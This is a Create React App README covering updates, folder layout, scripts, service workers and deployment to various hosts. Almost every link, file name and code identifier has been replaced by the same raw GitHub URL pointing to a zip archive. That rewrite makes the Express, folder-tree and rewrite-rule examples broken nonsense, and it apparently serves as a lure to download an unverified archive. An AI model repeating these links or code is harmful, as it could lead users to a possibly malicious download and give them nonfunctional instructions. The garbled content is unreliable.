This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

Below you will find some information on how to perform common tasks.<br>
You can find the most recent version of this guide [here](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

## Updating to New Releases

Create React App is divided into two packages:

* `create-react-app` is a global command-line utility that you use to create new projects.
* `react-scripts` is a development dependency in the generated projects (including this one).

You almost never need to update `create-react-app` itself: it delegates all the setup to `react-scripts`.

When you run `create-react-app`, it always creates the project with the latest version of `react-scripts` so you’ll get all the new features and improvements in newly created apps automatically.

To update an existing project to a new version of `react-scripts`, [open the changelog](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), find the version you’re currently on (check `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` in this folder if you’re not sure), and apply the migration instructions for the newer versions.

In most cases bumping the `react-scripts` version in `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` and running `npm install` in this folder should be enough, but it’s good to consult the [changelog](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) for potential breaking changes.

We commit to keeping the breaking changes minimal so you can upgrade `react-scripts` painlessly.

## Folder Structure

After creation, your project should look like this:

```
my-app/
  https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
  node_modules/
  https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
  public/
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
  src/
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
```

For the project to build, **these files must exist with exact filenames**:

* `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` is the page template;
* `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` is the JavaScript entry point.

You can delete or rename the other files.

You may create subdirectories inside `src`. For faster rebuilds, only files inside `src` are processed by Webpack.<br>
You need to **put any JS and CSS files inside `src`**, otherwise Webpack won’t see them.

Only files inside `public` can be used from `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`.<br>
Read instructions below for using assets from JavaScript and HTML.

You can, however, create more top-level directories.<br>
They will not be included in the production build so you can use them for things like documentation.

## Available Scripts

In the project directory, you can run:

### `yarn start`

Starts the development server.<br>
Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

The page will reload if you make edits.<br>
You will also see any lint errors in the console.

### `npm test`

Starts the test runner.<br>
See the section about [running tests](#running-tests) for more information.

### `yarn build`

Bundles the app into static files for production.

The build is minified and the filenames include the hashes.<br>
Your app is ready to be deployed!

See the section about [deployment](#deployment) for more information.

### `yarn eject`

**Note: this is a one-way operation. Once you `eject`, you can’t go back!**

Removes this tool and copies build dependencies, configuration files and scripts into the app directory. If you do this, you can’t go back!


## Displaying Lint Output in the Editor

>Note: this feature is available with `react-scripts@0.2.0` and higher.<br>
>It also only works with npm 3 or higher.

Some editors, including Sublime Text, Atom, and Visual Studio Code, provide plugins for ESLint.

They are not required for linting. You should see the linter output right in your terminal as well as the browser console. However, if you prefer the lint results to appear right in your editor, there are some extra steps you can do.

You would need to install an ESLint plugin for your editor first. Then, add a file called `.eslintrc` to the project root:

```js
{
  "extends": "react-app"
}
```

Now your editor should report the linting warnings.

Note that even if you edit your `.eslintrc` file further, these changes will **only affect the editor integration**. They won’t affect the terminal and in-browser lint output. This is because Create React App intentionally provides a minimal set of rules that find common mistakes.

## Making a Progressive Web App

By default, the production build is a fully functional, offline-first
[Progressive Web App](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

Progressive Web Apps are faster and more reliable than traditional web pages, and provide an engaging mobile experience:

 * All static site assets are cached so that your page loads fast on subsequent visits, regardless of network connectivity (such as 2G or 3G). Updates are downloaded in the background.
 * Your app will work regardless of network state, even if offline. This means your users will be able to use your app at 10,000 feet and on the subway.
 * On mobile devices, your app can be added directly to the user's home screen, app icon and all. You can also re-engage users using web **push notifications**. This eliminates the need for the app store.

The [`sw-precache-webpack-plugin`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
is integrated into production configuration,
and it will take care of generating a service worker file that will automatically
precache all of your local assets and keep them up to date as you deploy updates.
The service worker will use a [cache-first strategy](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
for handling all requests for local assets, including the initial HTML, ensuring
that your web app is reliably fast, even on a slow or unreliable network.

### Opting Out of Caching

If you would prefer not to enable service workers prior to your initial
production deployment, then remove the call to `registerServiceWorker()`
from [`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

If you had previously enabled service workers in your production deployment and
have decided that you would like to disable them for all your existing users,
you can swap out the call to `registerServiceWorker()` in
[`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) first by modifying the service worker import:
```javascript
import { unregister } from './registerServiceWorker';
```
and then call `unregister()` instead.
After the user visits a page that has `unregister()`,
the service worker will be uninstalled. Note that depending on how `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` is served,
it may take up to 24 hours for the cache to be invalidated.

### Offline-First Considerations

1. Service workers [require HTTPS](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip),
although to facilitate local testing, that policy
[does not apply to `localhost`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).
If your production web server does not support HTTPS, then the service worker
registration will fail, but the rest of your web app will remain functional.

1. Service workers are [not currently supported](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
in all web browsers. Service worker registration [won't be attempted](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
on browsers that lack support.

1. The service worker is only enabled in the [production environment](#deployment),
e.g. the output of `npm run build`. It's recommended that you do not enable an
offline-first service worker in a development environment, as it can lead to
frustration when previously cached assets are used and do not include the latest
changes you've made locally.

1. If you *need* to test your offline-first service worker locally, build
the application (using `npm run build`) and run a simple http server from your
build directory. After running the build script, `create-react-app` will give
instructions for one way to test your production build locally and the [deployment instructions](#deployment) have
instructions for using other methods. *Be sure to always use an
incognito window to avoid complications with your browser cache.*

1. If possible, configure your production environment to serve the generated
`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` [with HTTP caching disabled](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).
If that's not possible—[GitHub Pages](#github-pages), for instance, does not
allow you to change the default 10 minute HTTP cache lifetime—then be aware
that if you visit your production site, and then revisit again before
`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` has expired from your HTTP cache, you'll continue to get
the previously cached assets from the service worker. If you have an immediate
need to view your updated production deployment, performing a shift-refresh
will temporarily disable the service worker and retrieve all assets from the
network.

1. Users aren't always familiar with offline-first web apps. It can be useful to
[let the user know](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
when the service worker has finished populating your caches (showing a "This web
app works offline!" message) and also let them know when the service worker has
fetched the latest updates that will be available the next time they load the
page (showing a "New content is available; please refresh." message). Showing
this messages is currently left as an exercise to the developer, but as a
starting point, you can make use of the logic included in [`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), which
demonstrates which service worker lifecycle events to listen for to detect each
scenario, and which as a default, just logs appropriate messages to the
JavaScript console.

1. By default, the generated service worker file will not intercept or cache any
cross-origin traffic, like HTTP [API requests](#integrating-with-an-api-backend),
images, or embeds loaded from a different domain. If you would like to use a
runtime caching strategy for those requests, you can [`eject`](#npm-run-eject)
and then configure the
[`runtimeCaching`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
option in the `SWPrecacheWebpackPlugin` section of
[`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

### Progressive Web App Metadata

The default configuration includes a web app manifest located at
[`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), that you can customize with
details specific to your web application.

When a user adds a web app to their homescreen using Chrome or Firefox on
Android, the metadata in [`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) determines what
icons, names, and branding colors to use when the web app is displayed.
[The Web App Manifest guide](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
provides more context about what each field means, and how your customizations
will affect your users' experience.

## Analyzing the Bundle Size

[Source map explorer](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) analyzes
JavaScript bundles using the source maps. This helps you understand where code
bloat is coming from.

To add Source map explorer to a Create React App project, follow these steps:

```sh
npm install --save source-map-explorer
```

Alternatively you may use `yarn`:

```sh
yarn add source-map-explorer
```

Then in `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`, add the following line to `scripts`:

```diff
   "scripts": {
+    "analyze": "source-map-explorer build/static/js/main.*",
     "start": "react-scripts start",
     "build": "react-scripts build",
     "test": "react-scripts test --env=jsdom",
```

Then to analyze the bundle run the production build then run the analyze
script.

```
npm run build
npm run analyze
```

## Deployment

`npm run build` creates a `build` directory with a production build of your app. Set up your favourite HTTP server so that a visitor to your site is served `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`, and requests to static paths like `/static/js/main.<hash>.js` are served with the contents of the `/static/js/main.<hash>.js` file.

### Static Server

For environments using [Node](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), the easiest way to handle this would be to install [serve](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) and let it handle the rest:

```sh
npm install -g serve
serve -s build
```

The last command shown above will serve your static site on the port **5000**. Like many of [serve](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)’s internal settings, the port can be adjusted using the `-p` or `--port` flags.

Run this command to get a full list of the options available:

```sh
serve -h
```

### Other Solutions

You don’t necessarily need a static server in order to run a Create React App project in production. It works just as fine integrated into an existing dynamic one.

Here’s a programmatic example using [Node](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) and [Express](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip):

```javascript
const express = require('express');
const path = require('path');
const app = express();

https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(__dirname, 'build')));

https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip('/', function (req, res) {
  https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(__dirname, 'build', 'https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip'));
});

https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(9000);
```

The choice of your server software isn’t important either. Since Create React App is completely platform-agnostic, there’s no need to explicitly use Node.

The `build` folder with static assets is the only output produced by Create React App.

However this is not quite enough if you use client-side routing. Read the next section if you want to support URLs like `/todos/42` in your single-page app.

### Serving Apps with Client-Side Routing

If you use routers that use the HTML5 [`pushState` history API](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) under the hood (for example, [React Router](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) with `browserHistory`), many static file servers will fail. For example, if you used React Router with a route for `/todos/42`, the development server will respond to `localhost:3000/todos/42` properly, but an Express serving a production build as above will not.

This is because when there is a fresh page load for a `/todos/42`, the server looks for the file `build/todos/42` and does not find it. The server needs to be configured to respond to a request to `/todos/42` by serving `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`. For example, we can amend our Express example above to serve `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` for any unknown paths:

```diff
 https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(__dirname, 'build')));

https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip('/', function (req, res) {
+https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip('/*', function (req, res) {
   https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip(__dirname, 'build', 'https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip'));
 });
```

If you’re using [Apache HTTP Server](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), you need to create a `.htaccess` file in the `public` folder that looks like this:

```
    Options -MultiViews
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^ https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip [QSA,L]
```

It will get copied to the `build` folder when you run `npm run build`. 

If you’re using [Apache Tomcat](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), you need to follow [this Stack Overflow answer](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

Now requests to `/todos/42` will be handled correctly both in development and in production.

On a production build, and in a browser that supports [service workers](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip),
the service worker will automatically handle all navigation requests, like for
`/todos/42`, by serving the cached copy of your `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`. This
service worker navigation routing can be configured or disabled by
[`eject`ing](#npm-run-eject) and then modifying the
[`navigateFallback`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
and [`navigateFallbackWhitelist`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
options of the `SWPreachePlugin` [configuration](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

When users install your app to the homescreen of their device the default configuration will make a shortcut to `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`. This may not work for client-side routers which expect the app to be served from `/`. Edit the web app manifest at [`https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) and change `start_url` to match the required URL scheme, for example:

```js
  "start_url": ".",
```

### Building for Relative Paths

By default, Create React App produces a build assuming your app is hosted at the server root.<br>
To override this, specify the `homepage` in your `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`, for example:

```js
  "homepage": "https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip",
```

This will let Create React App correctly infer the root path to use in the generated HTML file.

**Note**: If you are using `react-router@^4`, you can root `<Link>`s using the `basename` prop on any `<Router>`.<br>
More information [here](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).<br>
<br>
For example:
```js
<BrowserRouter basename="/calendar"/>
<Link to="/today"/> // renders <a href="/calendar/today">
```

#### Serving the Same Build from Different Paths

>Note: this feature is available with `react-scripts@0.9.0` and higher.

If you are not using the HTML5 `pushState` history API or not using client-side routing at all, it is unnecessary to specify the URL from which your app will be served. Instead, you can put this in your `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`:

```js
  "homepage": ".",
```

This will make sure that all the asset paths are relative to `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`. You will then be able to move your app from `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` to `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` or even `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` without having to rebuild it.

### [Azure](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

See [this](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) blog post on how to deploy your React app to Microsoft Azure.

### [Firebase](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

Install the Firebase CLI if you haven’t already by running `npm install -g firebase-tools`. Sign up for a [Firebase account](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) and create a new project. Run `firebase login` and login with your previous created Firebase account.

Then run the `firebase init` command from your project’s root. You need to choose the **Hosting: Configure and deploy Firebase Hosting sites** and choose the Firebase project you created in the previous step. You will need to agree with `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` being created, choose `build` as the public directory, and also agree to **Configure as a single-page app** by replying with `y`.

```sh
    === Project Setup

    First, let's associate this project directory with a Firebase project.
    You can create multiple project aliases by running firebase use --add,
    but for now we'll just set up a default project.

    ? What Firebase project do you want to associate as default? Example app (example-app-fd690)

    === Database Setup

    Firebase Realtime Database Rules allow you to define how your data should be
    structured and when your data can be read from and written to.

    ? What file should be used for Database Rules? https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    ✔  Database Rules for example-app-fd690 have been downloaded to https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    Future modifications to https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip will update Database Rules when you run
    firebase deploy.

    === Hosting Setup

    Your public directory is the folder (relative to your project directory) that
    will contain Hosting assets to uploaded with firebase deploy. If you
    have a build process for your assets, use your build's output directory.

    ? What do you want to use as your public directory? build
    ? Configure as a single-page app (rewrite all urls to https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)? Yes
    ✔  Wrote https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip

    i  Writing configuration info to https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    i  Writing project information to .firebaserc...

    ✔  Firebase initialization complete!
```

Now, after you create a production build with `npm run build`, you can deploy it by running `firebase deploy`.

```sh
    === Deploying to 'example-app-fd690'...

    i  deploying database, hosting
    ✔  database: rules ready to deploy.
    i  hosting: preparing build directory for upload...
    Uploading: [==============================          ] 75%✔  hosting: build folder uploaded successfully
    ✔  hosting: 8 files uploaded successfully
    i  starting release process (may take several minutes)...

    ✔  Deploy complete!

    Project Console: https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
    Hosting URL: https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip
```

For more information see [Add Firebase to your JavaScript Project](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

### [GitHub Pages](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

>Note: this feature is available with `react-scripts@0.2.0` and higher.

#### Step 1: Add `homepage` to `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`

**The step below is important!**<br>
**If you skip it, your app will not deploy correctly.**

Open your `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` and add a `homepage` field:

```js
  "homepage": "https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip",
```

Create React App uses the `homepage` field to determine the root URL in the built HTML file.

#### Step 2: Install `gh-pages` and add `deploy` to `scripts` in `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`

Now, whenever you run `npm run build`, you will see a cheat sheet with instructions on how to deploy to GitHub Pages.

To publish it at [https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip), run:

```sh
npm install --save gh-pages
```

Alternatively you may use `yarn`:

```sh
yarn add gh-pages
```

Add the following scripts in your `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`:

```diff
  "scripts": {
+   "predeploy": "npm run build",
+   "deploy": "gh-pages -d build",
    "start": "react-scripts start",
    "build": "react-scripts build",
```

The `predeploy` script will run automatically before `deploy` is run.

#### Step 3: Deploy the site by running `npm run deploy`

Then run:

```sh
npm run deploy
```

#### Step 4: Ensure your project’s settings use `gh-pages`

Finally, make sure **GitHub Pages** option in your GitHub project settings is set to use the `gh-pages` branch:

<img src="https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip" width="500" alt="gh-pages branch setting">

#### Step 5: Optionally, configure the domain

You can configure a custom domain with GitHub Pages by adding a `CNAME` file to the `public/` folder.

#### Notes on client-side routing

GitHub Pages doesn’t support routers that use the HTML5 `pushState` history API under the hood (for example, React Router using `browserHistory`). This is because when there is a fresh page load for a url like `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`, where `/todos/42` is a frontend route, the GitHub Pages server returns 404 because it knows nothing of `/todos/42`. If you want to add a router to a project hosted on GitHub Pages, here are a couple of solutions:

* You could switch from using HTML5 history API to routing with hashes. If you use React Router, you can switch to `hashHistory` for this effect, but the URL will be longer and more verbose (for example, `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`). [Read more](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) about different history implementations in React Router.
* Alternatively, you can use a trick to teach GitHub Pages to handle 404 by redirecting to your `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` page with a special redirect parameter. You would need to add a `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` file with the redirection code to the `build` folder before deploying your project, and you’ll need to add code handling the redirect parameter to `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`. You can find a detailed explanation of this technique [in this guide](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

### [Heroku](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

Use the [Heroku Buildpack for Create React App](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).<br>
You can find instructions in [Deploying React with Zero Configuration](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).

#### Resolving Heroku Deployment Errors

Sometimes `npm run build` works locally but fails during deploy via Heroku. Following are the most common cases.

##### "Module not found: Error: Cannot resolve 'file' or 'directory'"

If you get something like this:

```
remote: Failed to create a production build. Reason:
remote: Module not found: Error: Cannot resolve 'file' or 'directory'
MyDirectory in /tmp/build_1234/src
```

It means you need to ensure that the lettercase of the file or directory you `import` matches the one you see on your filesystem or on GitHub.

This is important because Linux (the operating system used by Heroku) is case sensitive. So `MyDirectory` and `mydirectory` are two distinct directories and thus, even though the project builds locally, the difference in case breaks the `import` statements on Heroku remotes.

##### "Could not find a required file."

If you exclude or ignore necessary files from the package you will see a error similar this one:

```
remote: Could not find a required file.
remote:   Name: `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`
remote:   Searched in: /tmp/build_a2875fc163b209225122d68916f1d4df/public
remote:
remote: npm ERR! Linux 3.13.0-105-generic
remote: npm ERR! argv "https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip" "https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip" "run" "build"
```

In this case, ensure that the file is there with the proper lettercase and that’s not ignored on your local `.gitignore` or `~https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip`.

### [Netlify](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

**To do a manual deploy to Netlify’s CDN:**

```sh
npm install netlify-cli
netlify deploy
```

Choose `build` as the path to deploy.

**To setup continuous delivery:**

With this setup Netlify will build and deploy when you push to git or open a pull request:

1. [Start a new netlify project](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)
2. Pick your Git hosting service and select your repository
3. Click `Build your site`

**Support for client-side routing:**

To support `pushState`, make sure to create a `public/_redirects` file with the following rewrite rules:

```
/*  https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip  200
```

When you build the project, Create React App will place the `public` folder contents into the build output.

### [Now](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

Now offers a zero-configuration single-command deployment. You can use `now` to deploy your app for free.

1. Install the `now` command-line tool either via the recommended [desktop tool](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) or via node with `npm install -g now`.

2. Build your app by running `npm run build`.

3. Move into the build directory by running `cd build`.

4. Run `now --name your-project-name` from within the build directory. You will see a **https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip** URL in your output like this:

    ```
    > Ready! https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip (copied to clipboard)
    ```

    Paste that URL into your browser when the build is complete, and you will see your deployed app.

Details are available in [this article.](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

### [S3](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) and [CloudFront](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

See this [blog post](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip) on how to deploy your React app to Amazon Web Services S3 and CloudFront.

### [Surge](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip)

Install the Surge CLI if you haven’t already by running `npm install -g surge`. Run the `surge` command and log in you or create a new account.

When asked about the project path, make sure to specify the `build` folder, for example:

```sh
       project path: /path/to/project/build
```

Note that in order to support routers that use HTML5 `pushState` API, you may want to rename the `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` in your build folder to `https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip` before deploying to Surge. This [ensures that every URL falls back to that file](https://raw.githubusercontent.com/gianverab/basic-react/master/protelytropteron/basic-react.zip).